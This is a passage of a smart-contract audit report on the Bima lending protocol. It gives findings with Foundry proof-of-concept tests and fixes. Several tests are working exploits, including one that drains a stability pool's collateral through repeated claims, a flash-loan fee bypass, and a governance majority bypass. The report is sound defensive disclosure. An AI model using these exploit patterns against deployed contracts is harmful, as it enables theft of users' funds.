    // verify user1 rewards
    vm.prank(users.user1);
    userReward = stakedBTCTroveMgr.claimReward(users.user1);
    assertEq(userReward, actualUserReward);

    // verify user2 rewards
    vm.prank(users.user2);
    userReward = stakedBTCTroveMgr.claimReward(users.user2);
    assertEq(userReward, actualUserReward);

    // firstWeekEmissions = 536870911875000000000000000
    // userReward * 2     = 526980153126016085593266824
    //
    // some rewards were not distributed and are effectively lost

    // if either users tries to claim again, nothing is returned
    assertEq(stakedBTCTroveMgr.claimableReward(users.user1), 0);
    assertEq(stakedBTCTroveMgr.claimableReward(users.user2), 0);

    vm.prank(users.user1);
    userReward = stakedBTCTroveMgr.claimReward(users.user1);
    assertEq(userReward, 0);
    vm.prank(users.user2);
    userReward = stakedBTCTroveMgr.claimReward(users.user2);
    assertEq(userReward, 0);

    // refresh mock oracle to prevent frozen feed revert
    mockOracle.refresh();

    // user2 closes their trove
    vm.prank(users.user2);
    borrowerOps.closeTrove(stakedBTCTroveMgr, users.user2);

    uint256 secondWeekEmissions = (initialUnallocated - firstWeekEmissions)*INIT_ES_WEEKLY_PCT/BIMA_100_PCT;
    assertEq(secondWeekEmissions, 402653183906250000000000000);
    assertEq(babelVault.weeklyEmissions(systemWeek + 1), secondWeekEmissions);

    // warp time by 1 week
    vm.warp(block.timestamp + 1 weeks);

    // user2 can't claim anything as they withdrew
    assertEq(stakedBTCTroveMgr.claimableReward(users.user2), 0);
    vm.prank(users.user2);
    userReward = stakedBTCTroveMgr.claimReward(users.user2);
    assertEq(userReward, 0);

    // user1 gets almost all the weekly emissions apart
    // from an amount that is lost
    actualUserReward = 388085427183354818500070297;
    assertEq(stakedBTCTroveMgr.claimableReward(users.user1), actualUserReward);

    vm.prank(users.user1);
    userReward = stakedBTCTroveMgr.claimReward(users.user1);
    assertEq(userReward, actualUserReward);

    // weekly emissions 402653183906250000000000000
    // user1 received   388085427183354818500070297

    // user1 can't claim more rewards
    assertEq(stakedBTCTroveMgr.claimableReward(users.user1), 0);
    vm.prank(users.user1);
    userReward = stakedBTCTroveMgr.claimReward(users.user1);
    assertEq(userReward, 0);
}
```

Run with: `forge test --match-contract BorrowerOperationsTest --match-test test_claimReward_someTroveManagerDebtRewardsLost`

**Recommended Mitigation:** This issue was found towards the end of the audit when filling in missing test suite coverage so the cause has not yet been determined and remains for the protocol team to investigate using the test suite. One way to prevent the issue is by not enabling `TroveManager` debtId emission rewards in `BabelVault`. The same issue may affect `TroveManager` mintId rewards.

**Bima:**
Acknowledged.

\clearpage
## Low Risk


### Implementation contracts should inherit from their interfaces enabling compile-time checks ensuring implementations correctly implement their interfaces

**Description:** Implementation contracts don't inherit from their interfaces which prevents compile-time checks that interfaces are correctly implemented. The interfaces and implementations also contain a lot of copy & paste duplicate definitions.

For example, examine the interface `IPriceFeed.sol` which [contains](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/interfaces/IPriceFeed.sol#L12-L42):
```solidity
function setOracle(
    address _token,
    address _chainlinkOracle,
    bytes4 sharePriceSignature,
    uint8 sharePriceDecimals,
    bool _isEthIndexed
) external;

function RESPONSE_TIMEOUT() external view returns (uint256);

function oracleRecords(
    address
)
    external
    view
    returns (
        address chainLinkOracle,
        uint8 decimals,
        bytes4 sharePriceSignature,
        uint8 sharePriceDecimals,
        bool isFeedWorking,
        bool isEthIndexed
    );
```

Then examine the implementation `PriceFeed.sol` ([1](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/PriceFeed.sol#L17-L25), [2](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/PriceFeed.sol#L60), [3](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/PriceFeed.sol#L85-L92)) which fails to correctly implement the `IPriceFeed` interface:
```solidity
struct OracleRecord {
    IAggregatorV3Interface chainLinkOracle;
    uint8 decimals;
    // @audit extra `heartbeat` members breaks interface `IPriceFeed::oracleRecords`
    uint32 heartbeat;
    bytes4 sharePriceSignature;
    uint8 sharePriceDecimals;
    bool isFeedWorking;
    bool isEthIndexed;

// @audit different name breaks interface `IPriceFeed::RESPONSE_TIMEOUT`
uint256 public constant RESPONSE_TIMEOUT_BUFFER = 1 hours;

function setOracle(
    address _token,
    address _chainlinkOracle,
    // @audit extra `heartbeat` members breaks interface `IPriceFeed::setOracle`
    uint32 _heartbeat,
    bytes4 sharePriceSignature,
    uint8 sharePriceDecimals,
    bool _isEthIndexed
) public onlyOwner {
}
```

**Impact:** Attempting to call `IPriceFeed::setOracle` reverts as it is missing the `_heartbeat` parameter in the interface. Similarly calling `IPriceFeed::oracleRecords` also reverts for the same reason and calling `IPriceFeed:: RESPONSE_TIMEOUT` reverts as the implementation has a different name for the variable.

**Recommended Mitigation:** Implementation contracts should inherit from their interfaces.

**Bima:**
Fixed in [PR39](https://github.com/Bima-Labs/bima-v1-core/pull/39) for all contracts except `DebtToken` and `BabelToken` which are dependent on external libraries whose interfaces we don't control.

**Cyfrin:** Resolved.


### `DebtToken::flashLoan` fees can be bypassed by borrowing in small amounts

**Description:** `DebtToken::flashLoan` fees can be bypassed by borrowing in small amounts to trigger [rounding down to zero](https://dacian.me/precision-loss-errors#heading-rounding-down-to-zero) precision loss in fee calculation. Since this function allows re-entrancy, the function can be re-entered multiple times to borrow larger amounts with zero fee.

**Impact:** Flash loan fees can be bypassed.

**Proof of Concept:** Add following test contract to `test/foundry/core/DebtTokenTest.t.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

// test setup
import {TestSetup, DebtToken} from "../TestSetup.sol";

contract DebtTokenTest is TestSetup {

    function test_flashLoan() external {
        // entire supply initially available to borrow
        assertEq(debtToken.maxFlashLoan(address(debtToken)), type(uint256).max);

        // expected fee for borrowing 1e18
        uint256 borrowAmount = 1e18;
        uint256 expectedFee  = borrowAmount * debtToken.FLASH_LOAN_FEE() / 10000;

        // fee should be > 0
        assertTrue(expectedFee > 0);

        // fee should exactly equal
        assertEq(debtToken.flashFee(address(debtToken), borrowAmount), expectedFee);

        // exploit rounding down to zero precision loss to get free flash loans
        // by borrowing in small amounts
        borrowAmount = 1111;
        assertEq(debtToken.flashFee(address(debtToken), borrowAmount), 0);

        // as DebtToken::flashLoan allows re-entrancy, the function can be re-entered
        // multiple times to borrow larger amounts at zero fee
    }
}
```

Run with: `forge test --match-test test_flashLoan`

**Recommended Mitigation:** `DebtToken::_flashFee` should revert if calculated fee is zero:
```solidity
function _flashFee(uint256 amount) internal pure returns (uint256 fee) {
    fee = (amount * FLASH_LOAN_FEE) / 10000;
    require(fee > 0, "ERC20FlashMint: amount too small");
}
```

**Bima:**
Fixed in commit [ddab178](https://github.com/Bima-Labs/bima-v1-core/commit/ddab178ec663f774b4f50f8ae3414988e6d25552).

**Cyfrin:** Verified.


### Using `ecrecover` directly vulnerable to signature malleability

**Description:** `DebtToken::permit` and `BabelToken::permit` call `ecrecover` directly but due to the symmetrical nature of the elliptic curve for every `[v,r,s]` there exists another `[v,r,s]` that returns the same valid result.

**Impact:** Usage of `ecrecover` directly is vulnerable to [signature malleability](https://dacian.me/signature-replay-attacks#heading-signature-malleability).

**Recommended Mitigation:** Use OpenZeppelin's [ECDSA](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol) library with a version of OpenZeppelin >= 4.7.3.

**Bima:**
Fixed in commit [343a449](https://github.com/Bima-Labs/bima-v1-core/commit/343a44900a9cc03d85c344d01e580eaa8a8dc098).

**Cyfrin:** Verified.


### Proposal creation bypasses minimum voting weight requirement when no tokens are locked hence no voting power exists

**Description:** `AdminVoting::minCreateProposalPct` specifies the minimum voting weight required to create proposals, however this is bypassed allowing anyone to create proposals when no tokens are locked and hence no voting power exists.

**Proof of Concept:** Firstly change `test/foundry/TestSetup.sol` to warp time forward in `setUp`:
```solidity
function setUp() public virtual {
    // prevent Foundry from setting block.timestamp = 1 which can cause
    // errors in this protocol
    vm.warp(1659973223);
```

Then add the following test contract to `/test/foundry/dao/AdminVotingTest.t.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {AdminVoting} from "../../../contracts/dao/AdminVoting.sol";

// test setup
import {TestSetup} from "../TestSetup.sol";

contract AdminVotingTest is TestSetup {
    AdminVoting adminVoting;

    uint256 constant internal INIT_MIN_CREATE_PROP_PCT = 10;   // 0.01%
    uint256 constant internal INIT_PROP_PASSING_PCT    = 2000; // 20%

    function setUp() public virtual override {
        super.setUp();

        adminVoting = new AdminVoting(address(babelCore),
                                      tokenLocker,
                                      INIT_MIN_CREATE_PROP_PCT,
                                      INIT_PROP_PASSING_PCT);
    }

    function test_constructor() external view {
        // parameters correctly set
        assertEq(adminVoting.minCreateProposalPct(), INIT_MIN_CREATE_PROP_PCT);
        assertEq(adminVoting.passingPct(), INIT_PROP_PASSING_PCT);
        assertEq(address(adminVoting.tokenLocker()), address(tokenLocker));

        // week initialized to zero
        assertEq(adminVoting.getWeek(), 0);
        assertEq(adminVoting.minCreateProposalWeight(), 0);

        // no proposals
        assertEq(adminVoting.getProposalCount(), 0);
    }

    function test_createNewProposal_inInitialState() external {
        // create dummy proposal
        AdminVoting.Action[] memory payload = new AdminVoting.Action[](1);
        payload[0].target = address(0x0);
        payload[0].data   = abi.encode("");

        uint256 lastProposalTimestamp = adminVoting.latestProposalTimestamp(users.user1);
        assertEq(lastProposalTimestamp, 0);

        // verify expected failure condition
        vm.startPrank(users.user1);
        vm.expectRevert("No proposals in first week");
        adminVoting.createNewProposal(users.user1, payload);

        // advance time by 1 week
        vm.warp(block.timestamp + 1 weeks);
        uint256 weekNum = 1;
        assertEq(adminVoting.getWeek(), weekNum);

        // verify there are no tokens locked
        assertEq(tokenLocker.getTotalWeightAt(weekNum), 0);

        // even though there are no tokens locked so users have no voting weight,
        // a user with no voting weight can still create a proposal!
        adminVoting.createNewProposal(users.user1, payload);
        vm.stopPrank();

        // verify proposal has been created
        assertEq(adminVoting.getProposalCount(), 1);

        // attempting to execute the proposal fails with correct error
        uint256 proposalId = 0;
        vm.expectRevert("Not passed");
        adminVoting.executeProposal(proposalId);

        // attempting to vote on the proposal fails with correct error
        vm.expectRevert("No vote weight");
        vm.prank(users.user1);
        adminVoting.voteForProposal(users.user1, proposalId, 0);

        // so this can't be exploited further
    }
}
```

Run with: `forge test --match-contract AdminVotingTest`.

**Recommended Mitigation:** Prevent proposal creation when there is no total voting weight for that week by changing `AdminVoting::minCreateProposalWeight` to revert in this case:
```diff
    function minCreateProposalWeight() public view returns (uint256) {
        uint256 week = getWeek();
        if (week == 0) return 0;
        week -= 1;

        uint256 totalWeight = tokenLocker.getTotalWeightAt(week);
+       require(totalWeight > 0, "Zero total voting weight for given week");

        return (totalWeight * minCreateProposalPct) / MAX_PCT;
    }
```

**Bima:**
Fixed in commit [2452681](https://github.com/Bima-Labs/bima-v1-core/commit/24526810c53c068955ad5ae166d7bd98f19ffc77).

**Cyfrin:** Verified.


### Easily bypass `setGuardian` proposal passing requirement

**Description:** `AdminVoting::createNewProposal` calls `_isSetGuardianPayload` to detect whether a proposal contains a call to `IBabelCore.setGuardian`. If `true` then it requires a 50.1% majority in order for the `setGuardian` proposal to succeed, otherwise it uses the configured proposal pass percentage which is expected to be lower.

However this only works if there is only 1 payload and that payload calls `IBabelCore.setGuardian`. A malicious actor can easily bypass this by creating a proposal with 2 payloads where the second payload just does nothing.

**Impact:** A malicious actor can easily create a malicious `setGuardian` proposal that can be passed with the lower pass percentage, bypassing the requirement for a 50.1% majority on `setGuardian` proposals.

**Proof of Concept:** Add the PoC function to `test/foundry/dao/AdminVotingTest.t.sol`:
```solidity
function test_createNewProposal_setGuardian() external {
    // create a setGuardian proposal that also contains a dummy proposal
    AdminVoting.Action[] memory payload = new AdminVoting.Action[](2);
    payload[0].target = address(0x0);
    payload[0].data   = abi.encode("");
    payload[1].target = address(babelCore);
    payload[1].data   = abi.encodeWithSelector(IBabelCore.setGuardian.selector, users.user1);

    // lock up user tokens to receive voting power
    vm.prank(users.user1);
    tokenLocker.lock(users.user1, INIT_BAB_TKN_TOTAL_SUPPLY, 52);

    // warp forward BOOTSTRAP_PERIOD so voting power becomes active
    // and setGuardian proposals are allowed
    vm.warp(block.timestamp + adminVoting.BOOTSTRAP_PERIOD());

    // create the proposal
    vm.prank(users.user1);
    adminVoting.createNewProposal(users.user1, payload);

    // verify requiredWeight is 50.1% majority for setGuardian proposals
    assertEq(adminVoting.getProposalRequiredWeight(0),
             (tokenLocker.getTotalWeight() * adminVoting.SET_GUARDIAN_PASSING_PCT()) /
             adminVoting.MAX_PCT());

    // fails since the first dummy payload evaded detection of the
    // second setGuardian payload
}
```

Run with: `forge test --match-test test_createNewProposal_setGuardian`

**Recommended Mitigation:** Rename `AdminVoting::_isSetGuardianPayload` to `_containsSetGuardianPayload` and have it iterate through every element of the payload; if any payload element contains a call to `IBabelCore.setGuardian` then it should enforce the 50.1% requirement for that proposal:
```solidity
function _containsSetGuardianPayload(uint256 payloadLength, Action[] memory payload) internal view returns (bool) {
    for(uint256 i; i<payloadLength; i++) {
        bytes memory data = payload[i].data;

        // Extract the call sig from payload data
        bytes4 sig;
        assembly {
            sig := mload(add(data, 0x20))
        }

        if(sig == IBabelCore.setGuardian.selector) return true;
    }

    return false;
}
```

**Bima:**
Fixed in commit [0e4e2c8](https://github.com/Bima-Labs/bima-v1-core/commit/0e4e2c8d2a54dc04db67edd28cb9fcf84ff0cda0).

**Cyfrin:** Verified.


### Don't allow cancellation of executed or cancelled proposals

**Description:** `AdminVoting::cancelProposal` and `InterimAdmin::cancelProposal` allow cancellation of executed or cancelled proposals which doesn't make logical sense and may mislead guardian as to the exact state of the proposal.

**Recommended Mitigation:** Prevent cancellation of executed or already cancelled proposals:
```diff
function cancelProposal(uint256 id) external {
    require(msg.sender == babelCore.guardian(), "Only guardian can cancel proposals");
    require(id < proposalData.length, "Invalid ID");

    Action[] storage payload = proposalPayloads[id];
    require(!_containsSetGuardianPayload(payload.length, payload), "Guardian replacement not cancellable");
+   require(!proposalData[id].processed, "Already processed");
    proposalData[id].processed = true;
    emit ProposalCancelled(id);
}
```

**Bima:**
Fixed in commits [18760cb](https://github.com/Bima-Labs/bima-v1-core/commit/18760cb7e6c345c86c8e4e65ddd33adacac858c7#diff-74ae9454ba1373343c226439eed1e6676cdd8be975155f9bdefffaa33c041f0cR309) and [97320f4](https://github.com/Bima-Labs/bima-v1-core/commit/97320f440af3522e34337336bbf5355cdc574393#diff-0803a35539c4beef705ebe4c97f2e5ca088748169727ad998076bf4c1d4d26f0R148-R149).

**Cyfrin:** Verified.


### `TokenLocker::getTotalWeightAt` should loop until input `week` not `systemWeek`

**Description:** `TokenLocker::getTotalWeightAt` should loop until input `week` not `systemWeek`:
```diff
- while (updatedWeek < systemWeek) {
+ while (updatedWeek < week) {
```

The current implementation returns the wrong output when `week < systemWeek` and the previous weekly writes have not occurred which triggers processing of the final `while` loop, since it counts all the way up to `systemWeek` instead of stopping once reaching the input `week`.

A similar function `getAccountWeightAt` does this final loop correctly counting only up to the input `week`. Other similar functions `IncentiveVoting::getReceiverWeightAt` and `getTotalWeightAt` also implement this correctly counting only up to the input `week`.

**Bima:**
Fixed in commit [dada78b](https://github.com/Bima-Labs/bima-v1-core/commit/dada78b865dc9f19a0b3d7e6fbd93fc1a2c4fb9a).

**Cyfrin:** Verified.


### Less tokens can be allocated to emission receivers than weekly emissions due to precision loss from division before multiplication

**Description:** `BabelVault` allows one or more emission receivers to be created and `IncentiveVoting` allows token lockers to vote for how the weekly token emissions should be distributed. Note that:

* `IncentiveVoting::getReceiverVotePct` performs a [division](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/IncentiveVoting.sol#L206) by `totalWeeklyWeights[week]`
* `EmissionSchedule::getReceiverWeeklyEmissions` [multiplies](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/EmissionSchedule.sol#L94) the previously-divided returned amount before dividing it again

This causes precision loss due to [division before multiplication](https://dacian.me/precision-loss-errors#heading-division-before-multiplication) such that the sum of the amounts allocated to individual receivers is less than the total weekly emission amount.

**Impact:** The difference between the total weekly emission amount and the sum of the amounts allocated to receivers is lost.

**Proof of Concept:** Add the following PoC function to `test/foundry/dao/VaultTest.t.sol`:
```solidity
function test_allocateNewEmissions_twoReceiversWithUnequalExtremeVotingWeight() public {
    // setup vault giving user1 half supply to lock for voting power
    uint256 initialUnallocated = _vaultSetupAndLockTokens(INIT_BAB_TKN_TOTAL_SUPPLY/2);

    // helper registers receivers and performs all necessary checks
    address receiver = address(mockEmissionReceiver);
    uint256 RECEIVER_ID = _vaultRegisterReceiver(receiver, 1);

    // owner registers second emissions receiver
    MockEmissionReceiver mockEmissionReceiver2 = new MockEmissionReceiver();
    address receiver2 = address(mockEmissionReceiver2);
    uint256 RECEIVER2_ID = _vaultRegisterReceiver(receiver2, 1);

    // user votes for both receivers to get emissions but with
    // extreme voting weights (1 and Max-1)
    IIncentiveVoting.Vote[] memory votes = new IIncentiveVoting.Vote[](2);
    votes[0].id = RECEIVER_ID;
    votes[0].points = 1;
    votes[1].id = RECEIVER2_ID;
    votes[1].points = incentiveVoting.MAX_POINTS()-1;

    vm.prank(users.user1);
    incentiveVoting.registerAccountWeightAndVote(users.user1, 52, votes);

    // warp time by 1 week
    vm.warp(block.timestamp + 1 weeks);

    // cache state prior to allocateNewEmissions
    uint16 systemWeek = SafeCast.toUint16(babelVault.getWeek());

    // initial unallocated supply has not changed
    assertEq(babelVault.unallocatedTotal(), initialUnallocated);

    // receiver calls allocateNewEmissions
    vm.prank(receiver);
    uint256 allocated = babelVault.allocateNewEmissions(RECEIVER_ID);

    // verify BabelVault::totalUpdateWeek current system week
    assertEq(babelVault.totalUpdateWeek(), systemWeek);

    // verify unallocated supply reduced by weekly emission percent
    uint256 firstWeekEmissions = initialUnallocated*INIT_ES_WEEKLY_PCT/MAX_PCT;
    assertTrue(firstWeekEmissions > 0);
    uint256 remainingUnallocated = initialUnallocated - firstWeekEmissions;
    assertEq(babelVault.unallocatedTotal(), remainingUnallocated);

    // verify emissions correctly set for current week
    assertEq(babelVault.weeklyEmissions(systemWeek), firstWeekEmissions);

    // verify BabelVault::lockWeeks reduced correctly
    assertEq(babelVault.lockWeeks(), INIT_ES_LOCK_WEEKS-INIT_ES_LOCK_DECAY_WEEKS);

    // verify receiver active and last processed week = system week
    (, bool isActive, uint16 updatedWeek) = babelVault.idToReceiver(RECEIVER_ID);
    assertEq(isActive, true);
    assertEq(updatedWeek, systemWeek);

    // receiver2 calls allocateNewEmissions
    vm.prank(receiver2);
    uint256 allocated2 = babelVault.allocateNewEmissions(RECEIVER2_ID);

    // verify most things remain the same
    assertEq(babelVault.totalUpdateWeek(), systemWeek);
    assertEq(babelVault.unallocatedTotal(), remainingUnallocated);
    assertEq(babelVault.weeklyEmissions(systemWeek), firstWeekEmissions);
    assertEq(babelVault.lockWeeks(), INIT_ES_LOCK_WEEKS-INIT_ES_LOCK_DECAY_WEEKS);

    // verify receiver2 active and last processed week = system week
    (, isActive, updatedWeek) = babelVault.idToReceiver(RECEIVER2_ID);
    assertEq(isActive, true);
    assertEq(updatedWeek, systemWeek);

    // verify that the recorded first week emissions is equal to
    // the amounts allocated to both receivers
    // fails here
    // firstWeekEmissions   = 536870911875000000000000000
    // allocated+allocated2 = 536870911874999999463129087
    assertEq(firstWeekEmissions, allocated + allocated2);
}
```

**Recommended Mitigation:** Replace `IncentiveVoting::getReceiverVotePct` with a new function `getReceiverVoteInputs` which doesn't perform any division but rather returns the inputs to the calculation:
```solidity
function getReceiverVoteInputs(uint256 id, uint256 week) external
returns (uint256 totalWeeklyWeight, uint256 receiverWeeklyWeight) {
    // lookback one week
    week -= 1;

    // update storage - id & total weights for any
    // missing weeks up to current system week
    getReceiverWeightWrite(id);
    getTotalWeightWrite();

    // output total weight for lookback week
    totalWeeklyWeight = totalWeeklyWeights[week];

    // if not zero, also output receiver weekly weight
    if(totalWeeklyWeight != 0) {
        receiverWeeklyWeight = receiverWeeklyWeights[id][week];
    }
}
```

Change `EmissionSchedule::getReceiverWeeklyEmissions` to use the new function:
```solidity
function getReceiverWeeklyEmissions(
    uint256 id,
    uint256 week,
    uint256 totalWeeklyEmissions
) external returns (uint256 amount) {
    // get vote calculation inputs from IncentiveVoting
    (uint256 totalWeeklyWeight, uint256 receiverWeeklyWeight)
        = voter.getReceiverVoteInputs(id, week);

    // if there was weekly weight, calculate the amount
    // otherwise default returns 0
    if(totalWeeklyWeight != 0) {
        amount = totalWeeklyEmissions * receiverWeeklyWeight / totalWeeklyWeight;
    }
}
```

In the provided PoC this reduces the precision loss to only 1 wei:
```solidity
assertEq(firstWeekEmissions,     536870911875000000000000000);
assertEq(allocated + allocated2, 536870911874999999999999999);
```

**Bima:**
Fixed in commit [3903717](https://github.com/Bima-Labs/bima-v1-core/commit/3903717bcff33684fe89080c1a2e98fcccd976cf).

**Cyfrin:** Verified.


### `StabilityPool::claimCollateralGains` should accrue depositor collateral gains before claiming

**Description:** `StabilityPool::claimCollateralGains` [reads](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/StabilityPool.sol#L706-L713) `collateralGainsByDepositor[msg.sender]` for each collateral to send users their gains.

However there is no call to `_accrueDepositorCollateralGain` which [updates](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/StabilityPool.sol#L560-L562) `collateralGainsByDepositor` with any new gains.

**Impact:** When calling `StabilityPool::claimCollateralGains` the user will not receive all the gains they were expecting. If the user realizes this they can trigger another action that calls `_accrueDepositorCollateralGain` before claiming to get their gains so at least the gains are not permanently lost - but the user may not even realize they didn't receive all the gains they were entitled to.

**Recommended Mitigation:** `StabilityPool::claimReward` should be made `public` instead of `external` and `claimCollateralGains` should call it prior to the remaining processing.

Prisma Finance [fixed](https://github.com/prisma-fi/prisma-contracts/commit/76dbc51db0c0d4c92a59776f5effc47e31e88087) this by having `claimCollateralGains` directly call `_accrueDepositorCollateralGain` but we found this resulted in a critical exploit that would allow an attacker to drain collateral tokens from the stability pool. Add the exploit PoC to [LiquidationManagerTest.t.sol](https://github.com/devdacian/bima-v1-core/blob/main/test/foundry/core/LiquidationManagerTest.t.sol):
```solidity
function test_attackerDrainsStabilityPoolCollateralTokens() external {
    // user1 and user 2 both deposit 10K into the stability pool
    uint96 spDepositAmount = 10_000e18;
    _provideToSP(users.user1, spDepositAmount, 1);
    _provideToSP(users.user2, spDepositAmount, 1);

    // user1 opens a trove using 1 BTC collateral (price = $60,000 in MockOracle)
    uint256 collateralAmount = 1e18;
    uint256 debtAmountMax = _getMaxDebtAmount(collateralAmount);

    _openTrove(users.user1, collateralAmount, debtAmountMax);

    // set new value of btc to $50,000 to make trove liquidatable
    mockOracle.setResponse(mockOracle.roundId() + 1,
                           int256(50000 * 10 ** 8),
                           block.timestamp + 1,
                           block.timestamp + 1,
                           mockOracle.answeredInRound() + 1);
    // warp time to prevent cached price being used
    vm.warp(block.timestamp + 1);

    // save previous state
    LiquidationState memory statePre = _getLiquidationState(users.user1);

    // both users deposits in the stability pool
    assertEq(statePre.stabPoolTotalDebtTokenDeposits, spDepositAmount * 2);

    // liquidate via `liquidate`
    liquidationMgr.liquidate(stakedBTCTroveMgr, users.user1);

    // save after state
    LiquidationState memory statePost = _getLiquidationState(users.user1);

    // verify trove owners count decreased
    assertEq(statePost.troveOwnersCount, statePre.troveOwnersCount - 1);

    // verify correct trove status
    assertEq(uint8(stakedBTCTroveMgr.getTroveStatus(users.user1)),
             uint8(ITroveManager.Status.closedByLiquidation));

    // user1 after state all zeros
    assertEq(statePost.userDebt, 0);
    assertEq(statePost.userColl, 0);
    assertEq(statePost.userPendingDebtReward, 0);
    assertEq(statePost.userPendingCollateralReward, 0);

    // verify total active debt & collateral reduced by liquidation
    assertEq(statePost.totalDebt, statePre.totalDebt - debtAmountMax - INIT_GAS_COMPENSATION);
    assertEq(statePost.totalColl, statePre.totalColl - collateralAmount);

    // verify stability pool debt token deposits reduced by amount used to offset liquidation
    uint256 userDebtPlusPendingRewards = statePre.userDebt + statePre.userPendingDebtReward;
    uint256 debtToOffsetUsingStabilityPool = BabelMath._min(userDebtPlusPendingRewards,
                                                            statePre.stabPoolTotalDebtTokenDeposits);

    // verify default debt calculated correctly
    assertEq(statePost.stabPoolTotalDebtTokenDeposits,
             statePre.stabPoolTotalDebtTokenDeposits - debtToOffsetUsingStabilityPool);
    assertEq(stakedBTCTroveMgr.defaultedDebt(),
             userDebtPlusPendingRewards - debtToOffsetUsingStabilityPool);

    // calculate expected collateral to liquidate
    uint256 collToLiquidate = statePre.userColl - _getCollGasCompensation(statePre.userColl);

    // calculate expected collateral to send to stability pool
    uint256 collToSendToStabilityPool = collToLiquidate *
                                        debtToOffsetUsingStabilityPool /
                                        userDebtPlusPendingRewards;

    // verify defaulted collateral calculated correctly
    assertEq(stakedBTCTroveMgr.defaultedCollateral(),
             collToLiquidate - collToSendToStabilityPool);

    assertEq(stakedBTCTroveMgr.L_collateral(), stakedBTCTroveMgr.defaultedCollateral());
    assertEq(stakedBTCTroveMgr.L_debt(), stakedBTCTroveMgr.defaultedDebt());

    // verify stability pool received collateral tokens
    assertEq(statePost.stabPoolStakedBTCBal, statePre.stabPoolStakedBTCBal + collToSendToStabilityPool);

    // verify stability pool lost debt tokens
    assertEq(statePost.stabPoolDebtTokenBal, statePre.stabPoolDebtTokenBal - debtToOffsetUsingStabilityPool);

    // no TroveManager errors
    assertEq(stakedBTCTroveMgr.lastCollateralError_Redistribution(), 0);
    assertEq(stakedBTCTroveMgr.lastDebtError_Redistribution(), 0);

    // user1 and user2 are both stability pool depositors so they
    // gain an equal share of the collateral sent to the stability pool
    // (at least in our PoC with simple whole numbers)
    uint256 collateralGainsPerUser = collToSendToStabilityPool / 2;

    uint256[] memory user1CollateralGains = stabilityPool.getDepositorCollateralGain(users.user1);
    assertEq(user1CollateralGains.length, 1);
    assertEq(user1CollateralGains[0], collateralGainsPerUser);

    uint256[] memory user2CollateralGains = stabilityPool.getDepositorCollateralGain(users.user2);
    assertEq(user2CollateralGains.length, 1);
    assertEq(user2CollateralGains[0], collateralGainsPerUser);

    // user2 claims their gains
    assertEq(stakedBTC.balanceOf(users.user2), 0);
    uint256[] memory collateralIndexes = new uint256[](1);
    collateralIndexes[0] = 0;
    vm.prank(users.user2);
    stabilityPool.claimCollateralGains(users.user2, collateralIndexes);
    assertEq(stakedBTC.balanceOf(users.user2), collateralGainsPerUser);
    assertEq(stakedBTC.balanceOf(address(stabilityPool)), statePost.stabPoolStakedBTCBal - collateralGainsPerUser);

    // user2 can immediately claim the same amount again!
    vm.prank(users.user2);
    stabilityPool.claimCollateralGains(users.user2, collateralIndexes);
    assertEq(stakedBTC.balanceOf(users.user2), collateralGainsPerUser * 2);
    assertEq(stakedBTC.balanceOf(address(stabilityPool)), 0);

    // user2 can keep claiming until they drain all the stability pool's
    // collateral tokens - in this case since there were only 2 depositors
    // with equal deposits, the second immediate claim has stolen the collateral
    // tokens that should have gone to user1

    // if user1 tries to claim this reverts since although StabilityPool
    // knows it owes user1 collateral gain tokens, it has been drained!
    vm.expectRevert("ERC20: transfer amount exceeds balance");
    vm.prank(users.user1);
    stabilityPool.claimCollateralGains(users.user2, collateralIndexes);
}
```

Run with: `forge test --match-test test_attackerDrainsStabilityPoolCollateralTokens`

**Bima:**
Fixed in commit [c3fc3e5](https://github.com/Bima-Labs/bima-v1-core/commit/c3fc3e5620a68b03ebfd832874342e084ca4921e).

**Cyfrin:** Verified.


### `StabilityPool::claimableReward` incorrectly returns lower than actual value as it doesn't include `storedPendingReward`

**Description:** `StabilityPool::claimableReward` is an `external view` function that can be used to show users their pending reward. However it doesn't [include](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/StabilityPool.sol#L577-L597) the amount inside `storedPendingReward[_depositor]` hence it will report a lower than true value.

Compare to `StabilityPool::_claimReward` which is used to actually claim the reward which does [include](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/StabilityPool.sol#L799-L802) `storedPendingReward[account]` into the total claimed reward.

**Impact:** User is told they have less rewards pending than they actually do.

**Recommended Mitigation:** `StabilityPool::claimableReward`  should include `storedPendingReward[_depositor]` into the total reward amount it returns.

**Bima:**
Fixed in commit [0de27a0](https://github.com/Bima-Labs/bima-v1-core/commit/0de27a0c172deb1be1c2338cb688d15940caf385).

**Cyfrin:** Verified.


### `StabilityPool` user functions panic revert if more than 256 collaterals are enabled

**Description:** `StabilityPool` has a number of mappings where the value component is an array with length 256:
```solidity
mapping(address depositor => uint256[256] deposits) public depositSums;
mapping(address depositor => uint80[256] gains) public collateralGainsByDepositor;
mapping(uint128 epoch => mapping(uint128 scale => uint256[256] sumS)) public epochToScaleToSums;
mapping(uint128 epoch => mapping(uint128 scale => uint256 sumG)) public epochToScaleToG;
```

There are a number of internal functions which iterate over every collateral then update these arrays, eg:
```solidity
function _updateSnapshots(address _depositor, uint256 _newValue) internal {
    uint256 length;
    if (_newValue == 0) {
        delete depositSnapshots[_depositor];

        length = collateralTokens.length;
        for (uint256 i; i < length; i++) {
            // @audit will panic revert if >= 257 collaterals are enabled
            depositSums[_depositor][i] = 0;
        }
```

